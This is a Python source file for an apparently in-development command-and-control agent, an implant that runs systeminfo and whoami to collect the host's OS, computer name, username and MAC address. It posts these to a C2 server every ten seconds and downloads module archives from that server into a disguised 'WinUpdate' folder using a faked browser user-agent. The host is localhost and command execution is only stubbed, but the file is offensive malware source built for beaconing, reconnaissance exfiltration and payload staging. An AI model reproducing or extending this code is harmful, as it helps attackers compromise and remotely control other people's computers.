"""
Agent
[X] grab operating_system, computer_name, username
[] Send POST req to server
"""

import os
import re
import time
import uuid

import requests

INDEX_COMPUTER_NAME = 0
INDEX_USERNAME = 1
RE_DATA_AFTER_MULTIPLE_SPACES = r'(.*): +(.*)'
API_METHOD_PUSH = 'push'
API_METHOD_GET = 'get'
API_METHOD_OUTPUT = 'output'
C2 = r'http://127.0.0.1:8000/api/{}/{}'
C2_MODULES_PATH = r'http://127.0.0.1:8000/api/modules/{}'
DISK_PATH = "{}\\WinUpdate".format(os.getenv('LOCALAPPDATA'))



def get_mac():
    """This function returns the first MAC address of the NIC of the PC"""
    return ':'.join(re.findall('..', '%012x' % uuid.getnode()))


def get_os():
    """Uses systeminfo to obtain the OS and OS Version
    Returns the concatenated string"""
    os_version = ''
    output_systeminfo = os.popen('systeminfo')
    for output in output_systeminfo.read().splitlines()[2:4]:
        info = re.match(RE_DATA_AFTER_MULTIPLE_SPACES, output)
        os_version += info.groups()[1]
        os_version += ' - '
    return os_version.rstrip(' -')


def get_computer_and_username():
    """Uses whoami to get the computer name and user name
    Returns it in a list"""
    output_whoami = os.popen('whoami')
    return output_whoami.read().strip().split('\\')


def process_response(post_object):
    """This function takes the response from the server and processes it"""
    if post_object != '""':
        if len(post_object.split()) == 3 and post_object.split()[0] == 'load' and post_object.split()[1] == 'module':
            # C2 is asking to load a module, so we will check if the module is
            # on disk or not, if not then we will download it from the server
            if post_object.split()[2] in [dI for dI in os.listdir(DISK_PATH) if
                                          os.path.isdir(
                                                  os.path.join(DISK_PATH, dI))]:
                print('module exist in here')
            else:
                with open(DISK_PATH + '\\' + post_object.split()[2] + '.zip',
                          'wb') as file:
                    headers = {
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36'}
                    response = requests.get(
                        C2_MODULES_PATH.format(post_object.split()[2]), headers)
                    file.write(response.content)
        else:
            # might be just normal commands
            print('Received command: {}'.format(post_object))
    else:
        # blank from the server, no commands given
        print('No commands given.')


def say_hello():
    """This function get the basic details of the current PC and sends it to
    the C2.
    The response from the C2 is then passed over to process_response to process"""
    post_object = {
        'operating_system': get_os(),
        'computer_name': get_computer_and_username()[INDEX_COMPUTER_NAME],
        'username': get_computer_and_username()[INDEX_USERNAME]
    }
    res = requests.post(C2.format(get_mac(), API_METHOD_GET), data=post_object)
    process_response(res.text)


def main():
    while True:
        say_hello()
        time.sleep(10)


if __name__ == '__main__':
    main()
